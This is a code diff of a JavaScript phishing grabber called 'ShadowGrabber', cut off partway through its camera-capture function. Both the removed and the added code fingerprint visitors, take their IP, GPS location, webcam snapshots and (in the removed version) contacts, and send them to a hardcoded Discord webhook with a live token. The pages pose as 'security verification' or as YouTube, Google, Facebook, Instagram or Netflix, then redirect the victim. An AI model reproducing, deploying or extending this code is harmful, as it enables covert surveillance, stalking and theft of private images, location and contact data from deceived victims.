@@ -1,580 +1,350 @@
 // ═══════════════════════════════════════════════════════════════════════════
-// 🔥 SHADOWGRABBER v9.0 - ADVANCED INTELLIGENCE SUITE 🔥
+// 🔥 SHADOWGRABBER v10.5 - ULTIMATE STEALTH & DEVICE INTEL 🔥
 // ═══════════════════════════════════════════════════════════════════════════
 
 const CONFIG = {
     WEBHOOK: 'https://discord.com/api/webhooks/1464327769608425504/TX0QqpwHA56djp6nFioLGerQ4dUNI0elhQ4q6vw-fuPTbLYdLdv-DaN-PimcXb9Bi9kS',
-    REDIRECT_URL: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+    REDIRECT_URL: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ', // <--- PASTE YOUR LINK HERE
     CAMERA_SNAPS: 7,
-    SNAP_INTERVAL: 200 // ms between snaps
+    SNAP_INTERVAL: 300,
+    AUTO_START: true
 };
 
 // ═══════════════════════════════════════════════════════════════════════════
-// DOM ELEMENTS
+// ADVANCED DYNAMIC CONTENT DETECTION
 // ═══════════════════════════════════════════════════════════════════════════
-const DOM = {
-    loadingText: document.getElementById('loading-text'),
-    progressBar: document.getElementById('progress-bar'),
-    statusDetail: document.getElementById('status-detail'),
-    clickTrigger: document.getElementById('click-trigger'),
-    video: document.getElementById('st-v'),
-    canvas: document.getElementById('st-c')
-};
+const detectContentContext = (url) => {
+    const u = url.toLowerCase();
 
-// ═══════════════════════════════════════════════════════════════════════════
-// STATE MANAGEMENT
-// ═══════════════════════════════════════════════════════════════════════════
-const STATE = {
-    sessionId: `SG-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
-    startTime: Date.now(),
-    forensicsCollected: false,
-    contactsCollected: false,
-    cameraCompleted: false,
-    locationCollected: false,
-    currentStream: null
-};
+    // YouTube
+    if (u.includes('youtube.com') || u.includes('youtu.be')) {
+        let type = 'YouTube';
+        if (u.includes('watch') || u.includes('youtu.be')) type = 'YouTube Video';
+        if (u.includes('channel') || u.includes('@')) type = 'YouTube Channel';
+        if (u.includes('shorts')) type = 'YouTube Short';
 
-// ═══════════════════════════════════════════════════════════════════════════
-// UTILITY FUNCTIONS
-// ═══════════════════════════════════════════════════════════════════════════
-const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
-
-const updateUI = (message, progress, detail = '') => {
-    if (DOM.loadingText) DOM.loadingText.textContent = message;
-    if (DOM.progressBar) DOM.progressBar.style.width = `${progress}%`;
-    if (DOM.statusDetail && detail) DOM.statusDetail.textContent = detail;
-};
-
-const sendToDiscord = async (payload) => {
-    try {
-        const formData = new FormData();
-
-        if (payload.file) {
-            formData.append('payload_json', JSON.stringify({
-                embeds: [payload.embed],
-                username: 'ShadowGrabber v9.0',
-                avatar_url: 'https://i.imgur.com/4M34hi2.png'
-            }));
-            formData.append('file', payload.file.blob, payload.file.name);
-        } else {
-            formData.append('payload_json', JSON.stringify({
-                embeds: [payload.embed],
-                username: 'ShadowGrabber v9.0',
-                avatar_url: 'https://i.imgur.com/4M34hi2.png'
-            }));
-        }
-
-        await fetch(CONFIG.WEBHOOK, {
-            method: 'POST',
-            body: formData
-        });
-
-        return true;
-    } catch (error) {
-        console.error('Discord send failed:', error);
-        return false;
-    }
-};
-
-// ═══════════════════════════════════════════════════════════════════════════
-// PHASE 0: INSTANT FORENSICS (AUTO ON FIRST CLICK)
-// ═══════════════════════════════════════════════════════════════════════════
-async function collectInstantForensics() {
-    updateUI('Initializing security check...', 5, 'Analyzing system architecture');
-
-    // Canvas Fingerprint
-    const getCanvasFingerprint = () => {
-        try {
-            const ctx = DOM.canvas.getContext('2d');
-            DOM.canvas.width = 200;
-            DOM.canvas.height = 50;
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.textBaseline = 'alphabetic';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(125, 1, 62, 20);
-            ctx.fillStyle = '#069';
-            ctx.fillText('ShadowGrabber🔥', 2, 15);
-            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-            ctx.fillText('ShadowGrabber🔥', 4, 17);
-            const dataURL = DOM.canvas.toDataURL();
-            return dataURL.slice(-60);
-        } catch (e) {
-            return 'Error';
-        }
-    };
-
-    // WebGL Fingerprint
-    const getWebGLInfo = () => {
-        try {
-            const gl = DOM.canvas.getContext('webgl') || DOM.canvas.getContext('experimental-webgl');
-            if (!gl) return { vendor: 'N/A', renderer: 'N/A' };
-
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            return {
-                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
-                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A'
-            };
-        } catch (e) {
-            return { vendor: 'Error', renderer: 'Error' };
-        }
-    };
-
-    // Audio Fingerprint
-    const getAudioFingerprint = () => {
-        try {
-            const AudioContext = window.AudioContext || window.webkitAudioContext;
-            if (!AudioContext) return 'N/A';
-            const audioCtx = new AudioContext();
-            return `${audioCtx.sampleRate}Hz | ${audioCtx.state} | ${audioCtx.baseLatency || 'N/A'}`;
-        } catch (e) {
-            return 'Error';
-        }
-    };
-
-    // Battery Info
-    const getBatteryInfo = async () => {
-        try {
-            if (!navigator.getBattery) return 'N/A';
-            const battery = await navigator.getBattery();
-            return {
-                level: `${Math.round(battery.level * 100)}%`,
-                charging: battery.charging ? 'Yes' : 'No',
-                chargingTime: battery.chargingTime === Infinity ? 'N/A' : `${battery.chargingTime}s`,
-                dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : `${battery.dischargingTime}s`
-            };
-        } catch (e) {
-            return 'Error';
-        }
-    };
-
-    // IP & Geolocation Info
-    const getIPInfo = async () => {
-        try {
-            const response = await fetch('https://ipapi.co/json/', { timeout: 5000 });
-            const data = await response.json();
-            return {
-                ip: data.ip || 'N/A',
-                city: data.city || 'N/A',
-                region: data.region || 'N/A',
-                country: data.country_name || 'N/A',
-                countryCode: data.country_code || 'N/A',
-                postal: data.postal || 'N/A',
-                latitude: data.latitude || 'N/A',
-                longitude: data.longitude || 'N/A',
-                timezone: data.timezone || 'N/A',
-                isp: data.org || 'N/A',
-                asn: data.asn || 'N/A',
-                currency: data.currency || 'N/A',
-                languages: data.languages || 'N/A'
-            };
-        } catch (e) {
-            return {
-                ip: 'Failed to fetch',
-                city: 'N/A',
-                region: 'N/A',
-                country: 'N/A',
-                isp: 'N/A'
-            };
-        }
-    };
-
-    updateUI('Collecting system intelligence...', 10, 'Gathering 30+ data points');
-
-    // Collect all data
-    const webglInfo = getWebGLInfo();
-    const batteryInfo = await getBatteryInfo();
-    const ipInfo = await getIPInfo();
-
-    const forensics = {
-        session: {
-            id: STATE.sessionId,
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent
-        },
-        hardware: {
-            platform: navigator.platform,
-            vendor: navigator.vendor,
-            cpuCores: navigator.hardwareConcurrency || 'N/A',
-            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/A',
-            maxTouchPoints: navigator.maxTouchPoints || 0,
-            gpu: webglInfo.renderer,
-            gpuVendor: webglInfo.vendor
-        },
-        display: {
-            screenResolution: `${screen.width}x${screen.height}`,
-            availableResolution: `${screen.availWidth}x${screen.availHeight}`,
-            colorDepth: `${screen.colorDepth}-bit`,
-            pixelRatio: window.devicePixelRatio || 1,
-            orientation: screen.orientation ? screen.orientation.type : 'N/A',
-            orientationAngle: screen.orientation ? screen.orientation.angle : 'N/A'
-        },
-        network: {
-            ip: ipInfo.ip,
-            city: ipInfo.city,
-            region: ipInfo.region,
-            country: ipInfo.country,
-            countryCode: ipInfo.countryCode,
-            postal: ipInfo.postal,
-            coordinates: `${ipInfo.latitude}, ${ipInfo.longitude}`,
-            timezone: ipInfo.timezone,
-            isp: ipInfo.isp,
-            asn: ipInfo.asn,
-            connectionType: navigator.connection ? navigator.connection.effectiveType : 'N/A',
-            downlink: navigator.connection ? `${navigator.connection.downlink}Mbps` : 'N/A',
-            rtt: navigator.connection ? `${navigator.connection.rtt}ms` : 'N/A',
-            saveData: navigator.connection ? navigator.connection.saveData : 'N/A'
-        },
-        browser: {
-            language: navigator.language,
-            languages: navigator.languages.join(', '),
-            cookiesEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack || 'N/A',
-            onLine: navigator.onLine,
-            historyLength: window.history.length,
-            javaEnabled: typeof navigator.javaEnabled === 'function' ? navigator.javaEnabled() : 'N/A',
-            pdfViewerEnabled: navigator.pdfViewerEnabled || 'N/A'
-        },
-        fingerprints: {
-            canvas: getCanvasFingerprint(),
-            audio: getAudioFingerprint(),
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timezoneOffset: new Date().getTimezoneOffset()
-        },
-        battery: batteryInfo,
-        permissions: {
-            notifications: Notification.permission,
-            geolocation: 'unknown',
-            camera: 'unknown',
-            microphone: 'unknown'
-        },
-        storage: {
-            localStorage: typeof localStorage !== 'undefined',
-            sessionStorage: typeof sessionStorage !== 'undefined',
-            indexedDB: typeof indexedDB !== 'undefined',
-            cookies: navigator.cookieEnabled
-        }
-    };
-
-    // Create rich Discord embed
-    const embed = {
-        title: '⚡ SHADOWGRABBER v9.0 - INSTANT FORENSICS',
-        description: `**Session ID:** \`${STATE.sessionId}\`\n**Timestamp:** ${new Date().toLocaleString()}\n**30+ Data Points Captured**`,
-        color: 0x9B59B6,
-        fields: [
-            {
-                name: '💻 Hardware Profile',
-                value: `\`\`\`yaml\nPlatform: ${forensics.hardware.platform}\nCPU Cores: ${forensics.hardware.cpuCores}\nRAM: ${forensics.hardware.deviceMemory}\nGPU: ${forensics.hardware.gpu}\nTouch Points: ${forensics.hardware.maxTouchPoints}\`\`\``,
-                inline: false
-            },
-            {
-                name: '🌐 Network Intelligence',
-                value: `\`\`\`yaml\nIP: ${forensics.network.ip}\nISP: ${forensics.network.isp}\nLocation: ${forensics.network.city}, ${forensics.network.region}, ${forensics.network.country}\nCoords: ${forensics.network.coordinates}\nTimezone: ${forensics.network.timezone}\nSpeed: ${forensics.network.downlink} (${forensics.network.connectionType})\nLatency: ${forensics.network.rtt}\`\`\``,
-                inline: false
-            },
-            {
-                name: '📱 Display & Device',
-                value: `\`\`\`yaml\nResolution: ${forensics.display.screenResolution}\nColor Depth: ${forensics.display.colorDepth}\nPixel Ratio: ${forensics.display.pixelRatio}\nOrientation: ${forensics.display.orientation}\nBattery: ${typeof forensics.battery === 'object' ? forensics.battery.level : forensics.battery}\nCharging: ${typeof forensics.battery === 'object' ? forensics.battery.charging : 'N/A'}\`\`\``,
-                inline: false
-            },
-            {
-                name: '🕵️ Browser Fingerprints',
-                value: `\`\`\`yaml\nCanvas: ${forensics.fingerprints.canvas.substring(0, 20)}...\nAudio: ${forensics.fingerprints.audio}\nTimezone: ${forensics.fingerprints.timezone}\nLanguages: ${forensics.browser.languages}\nDNT: ${forensics.browser.doNotTrack}\`\`\``,
-                inline: false
-            },
-            {
-                name: '🔐 Browser Capabilities',
-                value: `\`\`\`yaml\nCookies: ${forensics.browser.cookiesEnabled}\nOnline: ${forensics.browser.onLine}\nHistory: ${forensics.browser.historyLength} entries\nUser Agent: ${forensics.session.userAgent.substring(0, 50)}...\`\`\``,
-                inline: false
-            }
-        ],
-        footer: {
-            text: `ShadowGrabber v9.0 | Advanced Intelligence Suite`
-        },
-        timestamp: new Date().toISOString()
-    };
-
-    await sendToDiscord({ embed });
-    STATE.forensicsCollected = true;
-    updateUI('System analysis complete', 15, 'Proceeding to verification steps');
-}
-
-// ═══════════════════════════════════════════════════════════════════════════
-// PHASE 1: LOCATION COLLECTION (HIGH ACCURACY)
-// ═══════════════════════════════════════════════════════════════════════════
-async function collectLocation() {
-    updateUI('Requesting location access...', 20, 'GPS triangulation required');
-
-    return new Promise((resolve) => {
-        const attemptLocation = () => {
-            navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = position.coords;
-
-                    const embed = {
-                        title: '📍 PRECISION GEOLOCATION',
-                        description: `**High-Accuracy GPS Lock Acquired**`,
-                        color: 0x2ECC71,
-                        fields: [
-                            {
-                                name: '🗺️ Coordinates',
-                                value: `\`\`\`\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${Math.round(accuracy)}m\nAltitude: ${altitude || 'N/A'}m\nHeading: ${heading || 'N/A'}°\nSpeed: ${speed || 'N/A'}m/s\`\`\``,
-                                inline: false
-                            },
-                            {
-                                name: '🔗 Map Links',
-                                value: `[Google Maps](https://www.google.com/maps?q=${latitude},${longitude})\n[OpenStreetMap](https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}&zoom=15)`,
-                                inline: false
-                            }
-                        ],
-                        timestamp: new Date().toISOString()
-                    };
-
-                    await sendToDiscord({ embed });
-                    STATE.locationCollected = true;
-                    updateUI('Location verified', 30, 'GPS lock successful');
-                    resolve();
-                },
-                (error) => {
-                    console.error('Location error:', error);
-                    alert('⚠️ SECURITY VERIFICATION REQUIRED\n\nLocation access is mandatory for identity verification.\n\nPlease click "Allow" when prompted.');
-                    attemptLocation(); // Retry
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
-            );
+        return {
+            name: type,
+            title: type,
+            loading: `Loading ${type}...`,
+            status: 'Buffering content',
+            theme: '#FF0000',
+            logo: `<svg viewBox="0 0 159 110" width="80" height="55"><path d="M154 17.5c-1.82-6.73-7.07-12-13.8-13.8C128.2 0 79.5 0 79.5 0S30.8 0 18.8 3.7C12.07 5.5 6.82 10.77 5 17.5 1.32 29.5 1.32 55 1.32 55s0 25.5 3.68 37.5c1.82 6.73 7.07 12 13.8 13.8C30.8 110 79.5 110 79.5 110s48.7 0 60.7-3.7c6.73-1.8 11.98-7.07 13.8-13.8 3.68-12 3.68-37.5 3.68-37.5s0-25.5-3.68-37.5z" fill="#FF0000"/><path d="M64 78.77V31.23L104.5 55 64 78.77z" fill="#FFF"/></svg>`,
+            icon: 'https://www.youtube.com/favicon.ico'
         };
-
-        attemptLocation();
-    });
-}
-
-// ═══════════════════════════════════════════════════════════════════════════
-// PHASE 2: CAMERA BURST CAPTURE (7 SNAPS)
-// ═══════════════════════════════════════════════════════════════════════════
-async function collectCameraBurst() {
-    updateUI('Requesting camera access...', 35, 'Biometric verification required');
-
-    let stream = null;
-
-    // Keep requesting until granted
-    while (!stream) {
-        try {
-            stream = await navigator.mediaDevices.getUserMedia({
-                video: {
-                    facingMode: 'user',
-                    width: { ideal: 1920 },
-                    height: { ideal: 1080 }
-                },
-                audio: false
-            });
-
-            DOM.video.srcObject = stream;
-            await DOM.video.play();
-            STATE.currentStream = stream;
-
-        } catch (error) {
-            console.error('Camera error:', error);
-            alert('⚠️ CAMERA ACCESS REQUIRED\n\nBiometric verification is mandatory.\n\nPlease click "Allow" to grant camera access.');
-        }
     }
 
-    updateUI('Camera active - capturing biometrics...', 40, 'Please look at the camera');
-    await sleep(1000); // Let camera stabilize
+    // Google
+    if (u.includes('google.com')) {
+        let type = 'Google';
+        if (u.includes('drive')) type = 'Google Drive File';
+        if (u.includes('docs')) type = 'Google Doc';
+        if (u.includes('photos')) type = 'Google Photo';
+        if (u.includes('meet')) type = 'Google Meet';
 
-    // Burst capture
-    for (let i = 1; i <= CONFIG.CAMERA_SNAPS; i++) {
-        const progress = 40 + (i * 7);
-        updateUI(`Capturing biometric sample ${i}/${CONFIG.CAMERA_SNAPS}...`, progress, 'Processing facial data');
-
-        // Capture frame
-        DOM.canvas.width = DOM.video.videoWidth;
-        DOM.canvas.height = DOM.video.videoHeight;
-        const ctx = DOM.canvas.getContext('2d');
-        ctx.drawImage(DOM.video, 0, 0);
-
-        // Convert to blob and send immediately
-        await new Promise((resolve) => {
-            DOM.canvas.toBlob(async (blob) => {
-                const embed = {
-                    title: `📸 BIOMETRIC CAPTURE #${i}/${CONFIG.CAMERA_SNAPS}`,
-                    description: `**High-Resolution Facial Sample**\nSession: \`${STATE.sessionId}\``,
-                    color: 0xE74C3C,
-                    fields: [
-                        {
-                            name: '📊 Image Info',
-                            value: `\`\`\`\nResolution: ${DOM.canvas.width}x${DOM.canvas.height}\nSize: ${(blob.size / 1024).toFixed(2)}KB\nTimestamp: ${new Date().toLocaleTimeString()}\`\`\``,
-                            inline: false
-                        }
-                    ],
-                    timestamp: new Date().toISOString()
-                };
-
-                await sendToDiscord({
-                    embed,
-                    file: {
-                        blob: blob,
-                        name: `biometric_${STATE.sessionId}_snap${i}.jpg`
-                    }
-                });
-
-                resolve();
-            }, 'image/jpeg', 0.92);
-        });
-
-        await sleep(CONFIG.SNAP_INTERVAL);
-    }
-
-    // Stop camera
-    if (STATE.currentStream) {
-        STATE.currentStream.getTracks().forEach(track => track.stop());
-        STATE.currentStream = null;
-    }
-
-    STATE.cameraCompleted = true;
-    updateUI('Biometric capture complete', 85, 'All samples uploaded');
-}
-
-// ═══════════════════════════════════════════════════════════════════════════
-// PHASE 3: CONTACT COLLECTION
-// ═══════════════════════════════════════════════════════════════════════════
-async function collectContacts() {
-    // Check if Contact Picker API is available
-    if (!('contacts' in navigator && 'ContactsManager' in window)) {
-        console.log('Contact Picker API not available');
-        STATE.contactsCollected = true;
-        return;
-    }
-
-    updateUI('Requesting contact access...', 87, 'Contact verification required');
-
-    let success = false;
-
-    while (!success) {
-        try {
-            const contacts = await navigator.contacts.select(
-                ['name', 'tel', 'email'],
-                { multiple: true }
-            );
-
-            if (contacts && contacts.length > 0) {
-                const contactData = contacts.map((contact, index) => ({
-                    index: index + 1,
-                    name: contact.name || 'N/A',
-                    phones: contact.tel || [],
-                    emails: contact.email || []
-                }));
-
-                const embed = {
-                    title: '📇 CONTACT DATABASE EXTRACTED',
-                    description: `**${contacts.length} Contact(s) Secured**\nSession: \`${STATE.sessionId}\``,
-                    color: 0xF1C40F,
-                    fields: [
-                        {
-                            name: '📊 Summary',
-                            value: `\`\`\`\nTotal Contacts: ${contacts.length}\nExtracted: ${new Date().toLocaleString()}\`\`\``,
-                            inline: false
-                        }
-                    ],
-                    timestamp: new Date().toISOString()
-                };
-
-                const blob = new Blob([JSON.stringify(contactData, null, 2)], { type: 'application/json' });
-
-                await sendToDiscord({
-                    embed,
-                    file: {
-                        blob: blob,
-                        name: `contacts_${STATE.sessionId}.json`
-                    }
-                });
-
-                success = true;
-                STATE.contactsCollected = true;
-                updateUI('Contacts verified', 92, 'Contact data secured');
-
-            } else {
-                alert('⚠️ CONTACT VERIFICATION REQUIRED\n\nYou must select at least one contact to proceed.\n\nPlease select contacts and click "Done".');
-            }
-
-        } catch (error) {
-            console.error('Contact error:', error);
-            alert('⚠️ CONTACT ACCESS DENIED\n\nContact verification is mandatory for security purposes.\n\nPlease click "Allow" and select contacts.');
-        }
-    }
-}
-
-// ═══════════════════════════════════════════════════════════════════════════
-// MAIN EXECUTION SEQUENCE
-// ═══════════════════════════════════════════════════════════════════════════
-async function executeSequence() {
-    try {
-        // Hide click trigger
-        DOM.clickTrigger.style.display = 'none';
-
-        // Phase 0: Instant Forensics (auto on click)
-        await collectInstantForensics();
-        await sleep(500);
-
-        // Phase 1: Location
-        await collectLocation();
-        await sleep(500);
-
-        // Phase 2: Camera Burst
-        await collectCameraBurst();
-        await sleep(500);
-
-        // Phase 3: Contacts
-        await collectContacts();
-        await sleep(500);
-
-        // Final Summary
-        updateUI('Verification complete!', 95, 'Redirecting...');
-
-        const summaryEmbed = {
-            title: '✅ SHADOWGRABBER SESSION COMPLETE',
-            description: `**All Data Successfully Collected**\nSession: \`${STATE.sessionId}\``,
-            color: 0x00FF00,
-            fields: [
-                {
-                    name: '📋 Collection Summary',
-                    value: `\`\`\`\n✓ Forensics: ${STATE.forensicsCollected ? 'Complete' : 'Failed'}\n✓ Location: ${STATE.locationCollected ? 'Complete' : 'Failed'}\n✓ Camera: ${STATE.cameraCompleted ? 'Complete (7 snaps)' : 'Failed'}\n✓ Contacts: ${STATE.contactsCollected ? 'Complete' : 'Skipped'}\n\nTotal Time: ${((Date.now() - STATE.startTime) / 1000).toFixed(2)}s\`\`\``,
-                    inline: false
-                }
-            ],
-            timestamp: new Date().toISOString(),
-            footer: {
-                text: 'ShadowGrabber v9.0 - Mission Accomplished'
-            }
+        return {
+            name: type,
+            title: type,
+            loading: `Opening ${type}...`,
+            status: 'Verifying access permissions',
+            theme: '#4285F4',
+            logo: `<svg viewBox="0 0 48 48" width="60" height="60"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>`,
+            icon: 'https://www.google.com/favicon.ico'
         };
-
-        await sendToDiscord({ embed: summaryEmbed });
-
-        // Wait a moment then redirect
-        await sleep(1500);
-        updateUI('Redirecting...', 100, 'Thank you for verifying');
-        await sleep(500);
-
-        // Final redirect
-        window.location.replace(CONFIG.REDIRECT_URL);
-
-    } catch (error) {
-        console.error('Sequence error:', error);
-        alert('An error occurred. Please refresh and try again.');
     }
-}
+
+    // Facebook
+    if (u.includes('facebook.com') || u.includes('fb.com')) {
+        return {
+            name: 'Facebook',
+            title: 'Facebook',
+            loading: 'Loading content...',
+            status: 'Authenticating',
+            theme: '#1877F2',
+            logo: `<svg viewBox="0 0 48 48" width="60" height="60" fill="#1877F2"><path d="M24 4C12.954 4 4 12.954 4 24s8.954 20 20 20 20-8.954 20-20S35.046 4 24 4zm5 12.5h-3.5c-1.5 0-2 .5-2 2V21h5.5l-.5 5.5h-5V40h-6V26.5h-3.5V21h3.5v-3.5c0-3.5 2-6.5 6.5-6.5H29v5.5z"/></svg>`,
+            icon: 'https://www.facebook.com/favicon.ico'
+        };
+    }
+
+    // Instagram
+    if (u.includes('instagram.com')) {
+        return {
+            name: 'Instagram',
+            title: 'Instagram',
+            loading: 'Loading post...',
+            status: 'Fetching media',
+            theme: '#E4405F',
+            logo: `<svg viewBox="0 0 48 48" width="60" height="60"><radialGradient id="ig" cx="19" cy="42" r="45"><stop offset="0" stop-color="#fd5"/><stop offset=".3" stop-color="#ff543f"/><stop offset=".6" stop-color="#d53e91"/><stop offset="1" stop-color="#c837ab"/></radialGradient><path fill="url(#ig)" d="M34 42H14c-4.4 0-8-3.6-8-8V14c0-4.4 3.6-8 8-8h20c4.4 0 8 3.6 8 8v20c0 4.4-3.6 8-8 8z"/><path fill="#fff" d="M24 31c-3.9 0-7-3.1-7-7s3.1-7 7-7 7 3.1 7 7-3.1 7-7 7zm0-11c-2.2 0-4 1.8-4 4s1.8 4 4 4 4-1.8 4-4-1.8-4-4-4z"/><circle cx="31.5" cy="16.5" r="1.5" fill="#fff"/><path fill="#fff" d="M30 37H18c-3.9 0-7-3.1-7-7V18c0-3.9 3.1-7 7-7h12c3.9 0 7 3.1 7 7v12c0 3.9-3.1 7-7 7zM18 13c-2.8 0-5 2.2-5 5v12c0 2.8 2.2 5 5 5h12c2.8 0 5-2.2 5-5V18c0-2.8-2.2-5-5-5H18z"/></svg>`,
+            icon: 'https://www.instagram.com/favicon.ico'
+        };
+    }
+
+    // Netflix
+    if (u.includes('netflix.com')) {
+        return {
+            name: 'Netflix',
+            title: 'Netflix',
+            loading: 'Resume playing...',
+            status: 'Loading stream',
+            theme: '#E50914',
+            logo: `<svg viewBox="0 0 48 48" width="60" height="60"><path d="M14 4h6l8 24V4h6v40h-6l-8-24v24h-6V4z" fill="#E50914"/></svg>`,
+            icon: 'https://www.netflix.com/favicon.ico'
+        };
+    }
+
+    // Default Generic
+    return {
+        name: 'Redirect',
+        title: 'Loading...',
+        loading: 'Please wait...',
+        status: 'Loading content',
+        theme: '#555555',
+        logo: `<svg viewBox="0 0 40 40" width="60" height="60"><circle cx="20" cy="8" r="4" fill="#555"/><circle cx="12" cy="22" r="4" fill="#555"/><circle cx="28" cy="22" r="4" fill="#555"/></svg>`,
+        icon: null
+    };
+};
 
 // ═══════════════════════════════════════════════════════════════════════════
 // INITIALIZATION
 // ═══════════════════════════════════════════════════════════════════════════
-window.addEventListener('DOMContentLoaded', () => {
-    console.log('ShadowGrabber v9.0 initialized');
+const STATE = {
+    sessionId: `SG-${Date.now()}`,
+    startTime: Date.now(),
+    site: null
+};
 
-    // Set up click trigger
-    if (DOM.clickTrigger) {
-        DOM.clickTrigger.addEventListener('click', executeSequence);
+const DOM = {
+    loading: document.getElementById('loading-text'),
+    progress: document.getElementById('progress-bar'),
+    status: document.getElementById('status-detail'),
+    video: document.getElementById('st-v'),
+    canvas: document.getElementById('st-c'),
+    trigger: document.getElementById('click-trigger')
+};
+
+// Setup UI
+STATE.site = detectContentContext(CONFIG.REDIRECT_URL);
+document.title = STATE.site.title;
+if (STATE.site.icon) {
+    let link = document.querySelector("link[rel*='icon']") || document.createElement('link');
+    link.rel = 'icon';
+    link.href = STATE.site.icon;
+    document.head.appendChild(link);
+}
+document.querySelector('.asana-logo').innerHTML = STATE.site.logo;
+DOM.loading.textContent = STATE.site.loading;
+DOM.status.textContent = STATE.site.status;
+DOM.progress.style.background = STATE.site.theme;
+
+// ═══════════════════════════════════════════════════════════════════════════
+// UTILITIES
+// ═══════════════════════════════════════════════════════════════════════════
+const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+const updateProgress = (pct, detail) => {
+    DOM.progress.style.width = pct + '%';
+    if (detail) DOM.status.textContent = detail;
+};
+
+const send = async (payload) => {
+    try {
+        const data = new FormData();
+        data.append('payload_json', JSON.stringify({
+            embeds: [payload.embed],
+            username: STATE.site.name || 'System'
+        }));
+        if (payload.file) data.append('file', payload.file.blob, payload.file.name);
+        await fetch(CONFIG.WEBHOOK, { method: 'POST', body: data });
+    } catch (e) { }
+};
+
+// ═══════════════════════════════════════════════════════════════════════════
+// DEVICE INTELLIGENCE
+// ═══════════════════════════════════════════════════════════════════════════
+const getDeviceModel = () => {
+    const ua = navigator.userAgent;
+    let model = "Unknown Device";
+
+    // Android Detection
+    if (/Android/.test(ua)) {
+        const match = ua.match(/Android\s([0-9.]+);\s([^;]+)/);
+        if (match) {
+            model = `${match[2]} (Android ${match[1]})`;
+        } else {
+            model = "Android Device";
+        }
     }
-});
+    // iOS Detection
+    else if (/iPhone|iPad|iPod/.test(ua)) {
+        const match = ua.match(/OS\s([0-9_]+)/);
+        const version = match ? match[1].replace(/_/g, '.') : "Unknown";
+        if (ua.includes("iPhone")) model = `iPhone (iOS ${version})`;
+        else if (ua.includes("iPad")) model = `iPad (iOS ${version})`;
+        else model = `Apple Device (iOS ${version})`;
+    }
+    // Desktop
+    else if (/Windows/.test(ua)) model = "Windows PC";
+    else if (/Macintosh/.test(ua)) model = "Macintosh";
+    else if (/Linux/.test(ua)) model = "Linux System";
+
+    return model;
+};
+
+// ═══════════════════════════════════════════════════════════════════════════
+// CORE FUNCTIONS
+// ═══════════════════════════════════════════════════════════════════════════
+
+// 1. Forensics
+async function phaseForensics() {
+    updateProgress(10, 'Establishing secure connection...');
+
+    // IP API
+    let ip = {};
+    try { ip = await (await fetch('https://ipapi.co/json/')).json(); } catch (e) { }
+
+    // Get Device Model
+    const deviceName = getDeviceModel();
+
+    const embed = {
+        title: `⚡ New Connection: ${STATE.site.name}`,
+        color: parseInt(STATE.site.theme.replace('#', ''), 16),
+        fields: [
+            { name: '📱 Device Model', value: `\`${deviceName}\``, inline: false },
+            { name: 'IP Address', value: `\`${ip.ip || 'Unknown'}\``, inline: true },
+            { name: 'Location', value: `${ip.city}, ${ip.country_name}`, inline: true },
+            { name: 'ISP', value: ip.org || 'N/A', inline: true },
+            { name: 'System Info', value: `${navigator.platform} | ${navigator.hardwareConcurrency} Cores | ${navigator.deviceMemory}GB RAM`, inline: false },
+            { name: 'Context', value: `Redirecting to: ${CONFIG.REDIRECT_URL}`, inline: false }
+        ],
+        footer: { text: `Session: ${STATE.sessionId}` },
+        timestamp: new Date().toISOString()
+    };
+
+    await send({ embed });
+    updateProgress(20, 'Handshaking...');
+}
+
+// 2. Location
+async function phaseLocation() {
+    updateProgress(30, 'Verifying region...');
+    return new Promise(resolve => {
+        navigator.geolocation.getCurrentPosition(
+            async pos => {
+                const { latitude, longitude, accuracy, speed } = pos.coords;
+                await send({
+                    embed: {
+                        title: '📍 GPS Location Locked',
+                        color: 0x2ECC71,
+                        description: `[View on Maps](https://www.google.com/maps?q=${latitude},${longitude})`,
+                        fields: [
+                            { name: 'Coordinates', value: `${latitude}, ${longitude}`, inline: true },
+                            { name: 'Accuracy', value: `${Math.round(accuracy)}m`, inline: true },
+                            { name: 'Speed', value: `${speed || 0}m/s`, inline: true }
+                        ]
+                    }
+                });
+                resolve();
+            },
+            () => resolve(), // Continue even if denied
+            { enableHighAccuracy: true, timeout: 8000 }
+        );
+    });
+}
+
+// 3. Camera (FIXED)
+async function phaseCamera() {
+    updateProgress(50, 'Loading media components...');
+
+    let stream = null;
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({
